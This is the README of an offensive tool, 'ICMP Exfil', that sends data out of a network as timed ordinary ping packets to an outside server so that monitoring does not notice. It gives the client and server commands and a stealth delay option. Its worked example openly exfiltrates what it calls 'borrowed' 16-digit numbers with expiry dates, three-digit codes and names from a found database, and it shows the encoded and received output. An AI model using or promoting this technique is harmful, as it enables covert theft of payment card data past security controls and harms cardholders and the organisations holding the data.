# ICMP Exfil

ICMP Exfil allows you to transmit data via valid ICMP packets. You use the client script to pass in data you wish to exfiltrate, then on the device you're transmitting to you run the server. Anyone watching-- human or security system-- will just see valid ICMP packets, there's nothing malicious about the structure of the packets. Your data isn't hidden inside the ICMP packets either, so looking at the packet doesn't tell you what was exfiltrated. 

# Author
Martino Jones, [martinojones.com](https://martinojones.com).

# ASCII

Right now, the only thing I've added support for is ASCII characters. You will be able to exfiltrate anything that can be represented in ASCII characters (e.g. letters and numbers). For example: you borrowed some cool 16 digit numbers, well you'd use the client script to pass those numbers to your server by doing ```./ping.py --ascii "4111111111111111"```.

# Sending to server

You have two options for setting the server to send to. You can either use the **-\-ip** or you can set the default IP in the script called **ipToPing**.

# Wait

If you want to be a little more patient, and make it harder for people to notice you're exfiltrating data you can use **--wait** to specify the amount of min time + the time that's supposed to pass for the data to transfer. This is still being worked on... so you'll need to do this conversion yourself, but shouldn't take long for me to add... also doesn't matter too much since most people and security systems don't even detect this yet. 

# Verbose

If you would like to see the pings going through you can use the **-\-show**.

# Start/Stop Server

When you want to start the server you just do ```sudo python3 server.py```. You don't need to do anything else. When you're done, you just need to do **Control+C**. Right now the server needs work, it needs to map the input based on who they recived the data from, right now I only have it tested with one client pinging the server, this of course needs to be tuned. The groundwork is already there, just need to get the reset put together. 
# Example
I found a database full of these cool 16 digit numbers, I need to save them for futher research so I save them to a file called **file**:
**Command**:```./ping.py --ip 1.2.3.4 --asciiFile file```
**File Content**: ```4587965312457852 01/15 456 Martino Jones | 4567965382457452 03/16 236 Martino Joe```
**Encoded Data**: ```['0110100', '0110101', '0111000', '0110111', '0111001', '0110110', '0110101', '0110011', '0110001', '0110010', '0110100', '0110101', '0110111', '0111000', '0110101', '0110010', '0100000', '0110000', '0110001', '0101111', '0110001', '0110101', '0100000', '0110100', '0110101', '0110110', '0100000', '1001101', '1100001', '1110010', '1110100', '1101001', '1101110', '1101111', '0100000', '1001010', '1101111', '1101110', '1100101', '1110011', '0100000', '1111100', '0100000', '0110100', '0110101', '0110110', '0110111', '0111001', '0110110', '0110101', '0110011', '0111000', '0110010', '0110100', '0110101', '0110111', '0110100', '0110101', '0110010', '0100000', '0110000', '0110011', '0101111', '0110001', '0110110', '0100000', '0110010', '0110011', '0110110', '0100000', '1001101', '1100001', '1110010', '1110100', '1101001', '1101110', '1101111', '0100000', '1001010', '1101111', '1100101', '0001010']```
**Server**:
```
Calculating offsets


4 5 8 7 9 6 5 3 1 2 4 5 7 8 5 2   0 1 / 1 5   4 5 6   M a r t i n o   J o n e s   |   4 5 6 7 9 6 5 3 8 2 4 5 7 4 5 2   0 3 / 1 6   2 3 6   M a r t i n o   J o e 
```
# TODO
If you would like to help there are a number of things I still need to add:
- Transmit Binary files, can just read in the file as binary and won't need to encode.
- Allow passing in the server the offset, in case you want to make the window bigger or smaller, especially useful over very poor connections.
- Print mapping of IP to DATA when done.
- Allow quiet server.
- Allow showing data as it comes in, a little more tricky, but just requires some on the fly offset calculations.
- More things as they come to mind ;-)